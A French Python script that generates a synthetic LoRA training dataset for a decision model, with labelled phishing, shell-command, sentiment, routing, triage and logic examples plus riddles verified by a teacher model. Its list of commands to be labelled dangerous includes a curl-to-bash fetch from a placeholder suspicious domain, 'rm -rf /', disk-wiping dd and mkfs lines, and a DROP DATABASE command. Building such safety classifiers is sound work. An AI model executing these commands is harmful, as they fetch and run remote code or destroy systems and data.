"""
Générateur de jeu de données d'entraînement LoRA pour Ternary-Foq-Réflexe 8B.

Deux sources d'exemples, au format EXACT des prompts Foq (via les vraies classes de schemas.py) :
1. Cas métier paramétrés (étiquette certaine par construction, options mélangées) :
   sécurité, sentiment, routage, triage, logique, valeurs de référence, spam.
2. Pièges cognitifs inédits générés par le modèle professeur (27B CRACK), puis
   vérifiés à l'aveugle : le professeur doit retrouver la bonne réponse avec une
   confiance brute >= 0.85, sinon l'exemple est rejeté.

Règle d'or anti-contamination : les questions des benchmarks (precision_benchmark.py,
hardcore_benchmark.py) ne sont JAMAIS utilisées ici. Les pièges générés sont du même
style mais différents.

Sortie : data/lora_dataset.jsonl (+ data/lora_dataset_eval.jsonl pour l'évaluation).
Chaque ligne : {"prompt": str, "target_letter": "A".."J", "domain": str, "source": str}
"""

import sys
import os
import json
import random
import hashlib
import argparse

if sys.stdout.encoding != "utf-8":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

import httpx
from foq.engine import FoqEngine
from foq.schemas import Boolean, Score, ClassificationChoice


# ---------------------------------------------------------------------------
# Banques de vocabulaire pour les cas métier paramétrés
# ---------------------------------------------------------------------------

MARQUES = ["Netflix", "PayPal", "Amazon", "Orange Bank", "Steam", "LinkedIn", "La Poste", "Boursorama",
           "Uber", "Booking.com", "Apple", "Microsooft 365", "Impots.gouv", "Doctolib", "Leboncoin"]
DOMAINES_SUSPECTS = ["netflix-secure-billing-update.ru", "paypal-verification-account.top",
                     "mon-compte-secure-login.xyz", "apple-id-confirm.info", "support-paiement-safe.click"]
PRIX = ["19,99 €", "49,90 €", "1 250 €", "89 €", "340 €", "2 499 €"]

PHISHING_CTX = [
    "Votre compte {marque} a été suspendu pour activité suspecte. Cliquez sur http://{domaine}/login pour confirmer vos identifiants bancaires sous 24h.",
    "Alerte sécurité : un paiement de {prix} a été effectué sur votre compte {marque}. Annulez-le immédiatement via http://{domaine}­/refund.",
    "Félicitations ! Vous avez gagné un bon d'achat de {prix} chez {marque}. Réclamez-le sur http://{domaine} avec votre numéro de carte.",
    "Votre livraison {marque} est bloquée. Réglez {prix} de frais de douane sur http://{domaine} pour la débloquer.",
]
LEGIT_CTX = [
    "Bonjour, suite à notre rendez-vous de mardi, voici le compte-rendu et la facture au format PDF de notre prestation.",
    "Votre commande {n} chez {marque} a été expédiée. Suivez son acheminement depuis votre espace client habituel.",
    "Le service comptable vous informe que votre facture de {prix} a bien été réglée. Aucune action n'est requise.",
    "Confirmation de votre rendez-vous chez {marque} demain à 10h15. Merci d'arriver 5 minutes en avance.",
]

CMD_DANGEREUSES = [
    "curl -s http://{d}/payload.sh | bash",
    "rm -rf / --no-preserve-root",
    "chmod -R 777 /etc /var /root",
    "mkfs.ext4 /dev/sda1",
    "dd if=/dev/zero of=/dev/sda bs=1M",
    "python -c 'import os; os.system(\"rm -rf ~/*\")'",
    "mysql -u root -p'pass' -e 'DROP DATABASE production;'",
    "git push --force origin main --exec 'curl http://{d}/x.sh|sh'",
]
CMD_SURES = [
    "git commit -m 'Update docs' && git push origin feature/typo",
    "pip install -r requirements.txt",
    "ls -lah /var/log && df -h",
    "tar -czf backup.tar.gz ./documents",
    "pytest tests/ -q --cov",
    "docker compose up -d --wait",
    "rsync -av ./src/ user@backup-server:/srv/backup/",
]

SENT_POS = [
    "Un vrai coup de cœur, je recommande vivement ce produit à tout le monde.",
    "Livraison ultra-rapide, produit conforme, emballage soigné : parfait !",
    "Le conseiller a été d'une efficacité remarquable, problème réglé en 10 minutes.",
    "Excellent rapport qualité-prix, je rachèterai sans hésiter.",
    "Je suis conquise : simple, efficace, et le service suit vraiment les promesses.",
    "Franchement bluffé par la qualité, ça dépasse largement mes attentes.",
    "Deux ans d'utilisation quotidienne et toujours impeccable, chapeau.",
]
SENT_NEG = [
    "Une catastrophe : livré cassé, et le SAV ne répond pas depuis trois semaines.",
    "Arnaque totale, rien ne correspond à la description. Je veux être remboursé.",
    "Le pire service client de ma vie : 2h d'attente puis raccroché au nez.",
    "Produit tombé en panne au bout de 5 jours, inutilisable, je déconseille.",
    "Jamais reçu ma commande, aucun remboursement, on me renvoie d'un service à l'autre.",
    "Le double du prix affiché a été prélevé, et personne ne veut corriger l'erreur.",
    "Qualité déplorable : ça s'est déchiré au premier usage, une honte à ce tarif.",
]
SENT_NEUTRE = [
    "Le colis mesure 32 cm et pèse 780 grammes. La livraison est prévue jeudi.",
    "La réunion est reportée à 15h en salle B14. Merci d'avancer les slides.",
    "Le catalogue 2027 contient 214 références réparties en 6 catégories.",
    "L'agence est ouverte du lundi au samedi, de 9h à 18h30.",
    "Le montant du devis HT est de 1 240 €, TVA de 20 % non incluse.",
    "La formation obligatoire se déroulera en visioconférence sur trois demi-journées.",
    "L'archive demandée contient 48 dossiers scannés au format PDF pondéré.",
]
SENT_IRONIQUE = [
    "Super, encore une grève ! Bravo la compagnie, vous êtes vraiment les meilleurs...",
    "Génial, mon colis est 'livré' sauf que je ne l'ai jamais reçu. Merci beaucoup.",
    "Formidable, troisième panne cette semaine. Chapeau bas messieurs les ingénieurs.",
    "Ah oui, le 'service' client, un vrai modèle de rapidité : 4h d'attente, un régal.",
    "Magnifique, l'application 'intuitive' : trois crashs en dix minutes, du grand art.",
    "Fantastique, on m'a facturé deux fois, quelle inventivité comptable !",
    "Parfait, le taxi est arrivé 40 minutes après l'annulation. Logique, effectivement.",
]

DEPARTEMENTS = {
    "Facturation & Remboursement": ["prélevé de", "double facturation", "remboursement", "moyen de paiement expiré", "reconduction tacite", "avoir non reçu", "erreur de montant"],
    "Support Technique": ["erreur 500", "bug d'affichage", "API renvoie 502", "impossible de me connecter", "lenteurs anormales", "synchronisation bloquée", "certificat expiré"],
    "Ressources Humaines": ["candidature", "lettre de motivation", "entretien d'embauche", "congés payés", "attestation de travail", "mutuelle d'entreprise", "intégration d'un nouveau salarié"],
    "Vente & Commercial": ["devis pour", "tarif annuel", "déploiement pour 200 salariés", "démo de la solution", "contrat cadre", "renouvellement de licence", "parrainage"],
    "Service Juridique": ["mise en demeure", "poursuites judiciaires", "clause contractuelle contestée", "litige fournisseur", "RGPD violation", "propriété intellectuelle", "résiliation unilatérale"],
}

INCIDENTS_P0 = [
    "Incendie dans la salle des serveurs, coupure électrique totale du datacenter.",
    "Ransomware en cours de chiffrement sur 80 % des postes de l'entreprise.",
    "Fuite massive de données personnelles en cours vers une IP inconnue.",
    "Production totalement à l'arrêt : base de données principale corrompue.",
    "Panne du cluster Kubernetes de production : tous les services sont inaccessibles.",
    "Compromission avérée du compte administrateur avec élévation de privilèges active.",
]
INCIDENTS_P3 = [
    "Le logo du pied de page est décalé de 2 pixels sur la page Mentions légales.",
    "Une faute d'orthographe dans le texte de bienvenue de la newsletter.",
    "L'icône du bouton 'Aide' est légèrement floue sur les écrans Retina.",
    "La couleur du lien 'En savoir plus' ne respecte pas la nouvelle charte.",
    "Le libellé d'un champ du formulaire interne utilise l'ancien nom du service.",
    "La favicon du site de recette affiche encore l'ancien logo.",
]

# Syllogismes générés : catégories et individus
SYLLOGISMES = [
    ("chats", "félins"), ("chiens", "canidés"), ("merles", "oiseaux"), ("saumons", "poissons"),
    ("roses", "fleurs"), ("chênes", "arbres"), ("médecins", "professionnels de santé"),
    ("avocats", "juristes"), ("pianistes", "musiciens"), ("TGV", "trains"),
    ("dauphins", "mammifères marins"), ("moineaux", "oiseaux"), ("tulipes", "fleurs"),
    ("sapins", "conifères"), ("pharmaciens", "professionnels de santé"), ("notaires", "juristes"),
    ("violonistes", "musiciens"), ("tramways", "véhicules ferroviaires"), ("aigles", "rapaces"),
    ("carpes", "poissons"), ("gerbilles", "rongeurs"), ("léopards", "félins"),
    ("bouleaux", "arbres"), ("œillets", "fleurs"),
]
NOMS = ["Félix", "Médor", "Charlie", "Rex", "Lucas", "Emma", "Chloé", "Nina", "Oscar", "Léa",
        "Gabin", "Alice", "Hugo", "Jade", "Louis", "Mia", "Noé", "Rose", "Sacha", "Théo",
        "Yuma", "Zoé", "Bruno", "Diane", "Elsa", "Farid", "Gina", "Ilan", "Judith", "Karl",
        "Lila", "Marco", "Nadia", "Paolo", "Rita", "Samir"]

INCIDENTS_P1 = [
    "Le module de paiement est dégradé : une transaction sur dix échoue depuis ce matin.",
    "Lenteurs générales du site : temps de réponse triplé, clients mécontents.",
    "Le service d'envoi d'emails retarde toutes les notifications de plusieurs heures.",
    "La synchronisation entre l'outil RH et la paie a un écart d'une demi-journée, "
    "les corrections doivent être saisies deux fois.",
]
INCIDENTS_P2 = [
    "Le bouton d'export CSV produit un fichier avec des colonnes inversées, "
    "l'équipe doit réordonner les données à la main à chaque extraction.",
]

# Valeurs de référence médicales / techniques : (libellé, unité, norme_basse, norme_haute, générateur de valeurs)
NORMES = [
    ("température corporelle", "°C", 36.1, 37.8, [(36.7, "normal"), (37.2, "normal"), (39.4, "anormal"), (35.2, "anormal")]),
    ("glycémie à jeun", "g/L", 0.70, 1.10, [(0.92, "normal"), (1.05, "normal"), (1.45, "anormal"), (0.58, "anormal")]),
    ("fréquence cardiaque au repos d'un adulte", "bpm", 60, 100, [(72, "normal"), (84, "normal"), (135, "anormal"), (48, "anormal")]),
    ("délai de réponse SLA contractuel", "heures", 0, 4, [(1.5, "normal"), (3.9, "normal"), (7.2, "anormal"), (11.0, "anormal")]),
]


# ---------------------------------------------------------------------------
# Générateurs de cas métier : chaque générateur rend une dict d'« exemple brut »
# {context, question, options, correct_text, style}
# style: "choice" (options mélangées), "boolean" (Oui/Non), "score" (échelle ordonnée)
# ---------------------------------------------------------------------------

def _ex(context, question, options, correct_text, style="choice"):
    return {"context": context, "question": question, "options": options, "correct_text": correct_text, "style": style}


def gen_phishing(rng):
    if rng.random() < 0.55:
        ctx = rng.choice(PHISHING_CTX).format(marque=rng.choice(MARQUES), domaine=rng.choice(DOMAINES_SUSPECTS), prix=rng.choice(PRIX))
        return _ex(ctx, "Nature de ce message ?", ["Hameçonnage / Arnaque", "Notification légitime", "Communication interne anodine"], "Hameçonnage / Arnaque")
    ctx = rng.choice(LEGIT_CTX).format(marque=rng.choice(MARQUES), prix=rng.choice(PRIX), n=rng.randint(10000, 99999))
    return _ex(ctx, "Nature de ce message ?", ["Communication professionnelle légitime", "Hameçonnage / Arnaque", "Spam promotionnel"], "Communication professionnelle légitime")


def gen_commande(rng):
    if rng.random() < 0.5:
        cmd = rng.choice(CMD_DANGEREUSES).format(d=rng.choice(DOMAINES_SUSPECTS))
        return _ex(cmd, "Cette commande présente-t-elle un danger ?", ["Commande très dangereuse pour le système", "Commande courante et sûre", "Simple commande d'affichage"], "Commande très dangereuse pour le système")
    cmd = rng.choice(CMD_SURES)
    return _ex(cmd, "Cette commande présente-t-elle un danger ?", ["Commande courante et sûre", "Commande très dangereuse pour le système"], "Commande courante et sûre")


def gen_sentiment(rng):
    r = rng.random()
    if r < 0.25:
        ctx, bonne = rng.choice(SENT_POS), "Très positif"
    elif r < 0.5:
        ctx, bonne = rng.choice(SENT_NEG), "Très négatif"
    elif r < 0.75:
        ctx, bonne = rng.choice(SENT_NEUTRE), "Purement factuel / Neutre"
    else:
        ctx, bonne = rng.choice(SENT_IRONIQUE), "Ironie / mécontentement déguisé"
    return _ex(ctx, "Quelle est la tonalité réelle de ce texte ?", ["Très positif", "Très négatif", "Purement factuel / Neutre", "Ironie / mécontentement déguisé"], bonne)


def gen_routage(rng):
    dept, motifs = rng.choice(list(DEPARTEMENTS.items()))
    motif = rng.choice(motifs)
    ctx = f"Message client : « Bonjour, je vous contacte au sujet d'un problème de {motif}. Merci de traiter ma demande rapidement. »"
    autres = [d for d in DEPARTEMENTS if d != dept]
    rng.shuffle(autres)
    options = [dept] + autres[: rng.choice([2, 3])]
    rng.shuffle(options)
    return _ex(ctx, "Quel département doit traiter cette demande ?", options, dept)


def gen_triage(rng):
    if rng.random() < 0.5:
        ctx = rng.choice(INCIDENTS_P0)
        return _ex(ctx, "Niveau de priorité d'intervention ?", ["Urgence vitale / P0 Critique", "Priorité haute / P1", "Priorité basse / P3 Cosmétique"], "Urgence vitale / P0 Critique")
    ctx = rng.choice(INCIDENTS_P3)
    return _ex(ctx, "Niveau de priorité d'intervention ?", ["Priorité basse / P3 Cosmétique", "Priorité haute / P1", "Urgence vitale / P0 Critique"], "Priorité basse / P3 Cosmétique")


def gen_syllogisme(rng, _flip={"n": 0}):
    (a, b), nom = rng.choice(SYLLOGISMES), rng.choice(NOMS)
    # Alternance stricte positif/négatif : la réponse « Oui » (A) et « Non » (B)
    # doivent être équiréparties, sinon le modèle apprend un biais de lettre.
    _flip["n"] += 1
    positif = (_flip["n"] % 2 == 1)
    if positif:
        ctx = f"Tous les {a} sont des {b}. {nom} est un {a}."
        q = f"{nom} est-il un {b} ?"
        target_letter = "A"  # Oui
    else:
        autre, _ = rng.choice([s for s in SYLLOGISMES if s[0] != a])
        ctx = f"Tous les {a} sont des {b}. {nom} est un {autre}."
        q = f"{nom} est-il un {b} ?"
        target_letter = "B"  # Non
    return {"context": ctx, "question": q, "target_letter": target_letter, "style": "boolean"}


def gen_norme(rng):
    lib, unite, lo, hi, cas = rng.choice(NORMES)
    val, attendu = rng.choice(cas)
    ctx = f"Mesure relevée : {lib} = {val} {unite}. Plage de référence : {lo} à {hi} {unite}."
    if attendu == "normal":
        return _ex(ctx, "La mesure est-elle dans les normes ?", ["Oui, valeur dans la plage de référence", "Non, valeur hors norme"], "Oui, valeur dans la plage de référence")
    return _ex(ctx, "La mesure est-elle dans les normes ?", ["Non, valeur hors norme nécessitant une action", "Oui, valeur dans la plage de référence"], "Non, valeur hors norme nécessitant une action")


def gen_urgence_score(rng):
    """Style Score : échelle ordonnée 1-4, niveau correct uniforme sur les 4 degrés."""
    pools = [
        (INCIDENTS_P3, "1"),
        (INCIDENTS_P2, "2"),
        (INCIDENTS_P1, "3"),
        (INCIDENTS_P0, "4"),
    ]
    pool, niveau = rng.choice(pools)
    ctx = rng.choice(pool)
    levels = {"1": "Faible", "2": "Normal", "3": "Important", "4": "Critique"}
    return {"context": ctx, "question": "Niveau de gravité de la situation (1 à 4) ?", "levels": levels, "correct_level": niveau, "style": "score"}


GENERATORS = [
    (gen_phishing, 0.18),
    (gen_commande, 0.14),
    (gen_sentiment, 0.16),
    (gen_routage, 0.16),
    (gen_triage, 0.12),
    (gen_syllogisme, 0.10),
    (gen_norme, 0.08),
]


def format_example(ex, rng):
    """Transforme un exemple brut en (prompt, target_letter) via les VRAIES classes Foq."""
    # Variation de surface (numéro de ticket, politesse) : même fond, formulations différentes
    context = ex["context"]
    deco = rng.random()
    if deco < 0.3:
        context = f"[Ticket #{rng.randint(1000, 99999)}] {context}"
    elif deco < 0.5:
        context = f"Reçu le {rng.randint(1, 28)}/{rng.randint(1, 12)} : {context}"
    elif deco < 0.6:
        context = context + " Merci de traiter ce message rapidement."

    style = ex["style"]
    if style == "boolean":
        schema = Boolean(ex["question"])
        prompt = schema.format_prompt(context)
        return prompt, ex["target_letter"]
    if style == "score":
        schema = Score(ex["question"], levels=ex["levels"])
        prompt = schema.format_prompt(context)
        letter = chr(65 + list(ex["levels"].keys()).index(ex["correct_level"]))
        return prompt, letter
    # Position de la bonne réponse tirée uniformément (anti-biais de lettre : sans ça,
    # le modèle apprendrait « répondre B dans le doute »)
    options = [o for o in ex["options"] if o != ex["correct_text"]]
    rng.shuffle(options)
    options.insert(rng.randrange(len(ex["options"])), ex["correct_text"])
    correct_idx = options.index(ex["correct_text"])
    schema = ClassificationChoice(name="train", question=ex["question"], categories=options)
    prompt = schema.format_prompt(context)
    return prompt, chr(65 + correct_idx)


# ---------------------------------------------------------------------------
# Pièges cognitifs : générés par le professeur 27B puis vérifiés à l'aveugle
# ---------------------------------------------------------------------------

CATEGORIES_PIEGES = [
    "raisonnement spatial (ex : positions dans une course, ordre de dépassement, orientations)",
    "énigme linguistique (ex : familles, noms propres, lecture littérale)",
    "sens commun et réalisme (ex : comportement d'animaux, physique du quotidien)",
    "mathématiques contre-intuitives (ex : moyennes, vitesses, partages, probabilités)",
    "négations multiples et logique juridique",
    "physique ou biologie contre-intuitive",
]

GEN_SYSTEM = (
    "Tu es un créateur d'énigmes courtes à difficulté cognitive élevée destinées à entraîner un moteur de décision. "
    "Tu réponds UNIQUEMENT par des lignes JSON valides, sans numérotation, sans markdown, sans texte autour."
)


def build_riddle_prompt(categorie, n):
    return (
        "<|im_start|>system\n" + GEN_SYSTEM + "<|im_end|>\n"
        "<|im_start|>user\n"
        f"Génère {n} énigmes inédites de type : {categorie}.\n"
        "Format exact, une énigme par ligne :\n"
        '{"contexte": "...", "question": "...", "options": ["...","...","..."], "index_correct": 0}\n'
        "Règles : contexte de 1 à 3 phrases ; exactement 3 options courtes et distinctes ; "
        "UNE SEULE réponse objectivement correcte ; l'intuition première doit conduire à une mauvaise réponse ; "
        "varie les thèmes et les formulations d'une énigme à l'autre.\n"
        "<|im_end|>\n"
        # Bloc think vide : force le modèle de raisonnement à répondre immédiatement en JSON
        "<|im_start|>assistant\n<think>\n\n</think>\n"
    )


def parse_riddle_lines(text):
    out = []
    for line in text.splitlines():
        line = line.strip().rstrip(",")
        if not line.startswith("{"):
            continue
        try:
            d = json.loads(line)
        except Exception:
            continue
        if not isinstance(d, dict):
            continue
        ctx, q, opts, idx = d.get("contexte"), d.get("question"), d.get("options"), d.get("index_correct")
        if not isinstance(ctx, str) or not isinstance(q, str) or not isinstance(opts, list) or not isinstance(idx, int):
            continue
        opts = [str(o).strip() for o in opts if str(o).strip()]
        if len(opts) != 3 or len(set(opts)) != 3 or not (0 <= idx < 3):
            continue
        if len(ctx) < 20 or len(q) < 8:
            continue
        out.append({"context": ctx, "question": q, "options": opts, "correct_text": opts[idx]})
    return out


def generate_riddles(teacher_url, n_target, rng, verbose=True):
    engine = FoqEngine(base_url=teacher_url)
    if not engine.is_server_ready():
        print("[!] Serveur professeur indisponible :", teacher_url)
        return []
    client = httpx.Client(base_url=teacher_url, timeout=90.0)
    kept, seen, attempts = [], set(), 0

    while len(kept) < n_target and attempts < (n_target * 3 + 20):
        attempts += 1
        cat = rng.choice(CATEGORIES_PIEGES)
        try:
            resp = client.post("/completion", json={
                "prompt": build_riddle_prompt(cat, 5),
                "n_predict": 420,
                "temperature": 0.95,
                "top_p": 0.95,
                "cache_prompt": False,
            })
            resp.raise_for_status()
            content = resp.json().get("content", "")
        except Exception as e:
            if verbose:
                print(f"    [gen erreur] {e}")
            continue

        for riddle in parse_riddle_lines(content):
            if len(kept) >= n_target:
                break
            h = hashlib.md5((riddle["context"] + riddle["question"]).encode("utf-8")).hexdigest()
            if h in seen:
                continue
            seen.add(h)

            # Vérification à l'aveugle : le professeur doit retrouver la réponse attendue
            options = list(riddle["options"])
            rng.shuffle(options)
            schema = ClassificationChoice(name="verify", question=riddle["question"], categories=options)
            res = engine.decide(riddle["context"], schema, calibrate=False)
            if not res.get("success"):
                continue
            pred_text = options[ord(res["decision_key"]) - 65]
            conf = res.get("confidence", 0.0)
            if pred_text == riddle["correct_text"] and conf >= 0.85:
                prompt = schema.format_prompt(riddle["context"])
                kept.append({
                    "prompt": prompt,
                    "target_letter": res["decision_key"],
                    "domain": "piege_cognitif",
                    "source": "teacher",
                })
                if verbose:
                    print(f"    [+] piège validé ({len(kept)}/{n_target}) conf={conf:.0%}")

    engine.close()
    client.close()
    return kept


# ---------------------------------------------------------------------------
# Assemblage
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="Génération du jeu de données LoRA pour Foq-Réflexe 8B.")
    parser.add_argument("--teacher-url", default="http://127.0.0.1:8089", help="Serveur du modèle professeur (27B)")
    parser.add_argument("--count-business", type=int, default=4000)
    parser.add_argument("--count-riddles", type=int, default=250)
    parser.add_argument("--eval-frac", type=float, default=0.05)
    parser.add_argument("--seed", type=int, default=42)
    parser.add_argument("--output", default=os.path.join("data", "lora_dataset.jsonl"))
    args = parser.parse_args()
    rng = random.Random(args.seed)

    print("=" * 66)
    print("  GÉNÉRATION DU JEU DE DONNÉES D'ENTRAÎNEMENT LORA — FOQ 8B")
    print("=" * 66)

    # 1. Cas métier — quotas fixes par générateur (composition stable, indépendante
    #    des espaces de déduplication), complément en phishing si besoin
    print(f"[*] Génération de {args.count_business} cas métier paramétrés...", flush=True)
    QUOTAS = [
        (gen_phishing, int(args.count_business * 0.22)),
        (gen_commande, int(args.count_business * 0.14)),
        (gen_sentiment, int(args.count_business * 0.14)),
        (gen_routage, int(args.count_business * 0.16)),
        (gen_triage, int(args.count_business * 0.12)),
        (gen_syllogisme, int(args.count_business * 0.10)),
        (gen_norme, int(args.count_business * 0.06)),
        (gen_urgence_score, int(args.count_business * 0.06)),
    ]
    examples, seen = [], set()
    for gen, quota in QUOTAS:
        got, attempts, max_attempts = 0, 0, quota * 40
        while got < quota and attempts < max_attempts:
            attempts += 1
            ex = gen(rng)
            h = hashlib.md5((ex["context"] + ex["question"]).encode("utf-8")).hexdigest()
            if h in seen:
                continue
            seen.add(h)
            try:
                prompt, letter = format_example(ex, rng)
            except ValueError:
                continue
            examples.append({"prompt": prompt, "target_letter": letter, "domain": "metier", "source": "template"})
            got += 1
        print(f"    {gen.__name__:<18} {got}/{quota}", flush=True)

    # Complément plafonné : le phishing ne dépasse jamais sa part, la diversité prime
    print(f"[+] {len(examples)} cas métier générés (la diversité prime sur le volume).", flush=True)

    # 2. Pièges validés par le professeur
    print(f"[*] Génération de ~{args.count_riddles} pièges cognitifs via le professeur ({args.teacher_url})...")
    riddles = generate_riddles(args.teacher_url, args.count_riddles, rng)
    print(f"[+] {len(riddles)} pièges validés et conservés.")

    all_examples = examples + riddles
    rng.shuffle(all_examples)

    # 3. Répartition lettre / domaine (sanity check anti-biais)
    letters = {}
    for e in all_examples:
        letters[e["target_letter"]] = letters.get(e["target_letter"], 0) + 1
    print("[*] Distribution des lettres cibles :", dict(sorted(letters.items())))

    # 4. Découpage train / eval et écriture
    n_eval = max(1, int(len(all_examples) * args.eval_frac))
    eval_set, train_set = all_examples[:n_eval], all_examples[n_eval:]

    out_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", args.output))
    eval_path = out_path.replace(".jsonl", "_eval.jsonl")
    with open(out_path, "w", encoding="utf-8") as f:
        for e in train_set:
            f.write(json.dumps(e, ensure_ascii=False) + "\n")
    with open(eval_path, "w", encoding="utf-8") as f:
        for e in eval_set:
            f.write(json.dumps(e, ensure_ascii=False) + "\n")

    print(f"\n[+] ENTRAÎNEMENT : {len(train_set)} exemples -> {out_path}")
    print(f"[+] ÉVALUATION   : {len(eval_set)} exemples -> {eval_path}")
    print("[!] Rappel : les benchmarks 29+10 restent vierges (jamais utilisés pour l'entraînement).")


if __name__ == "__main__":
    main()
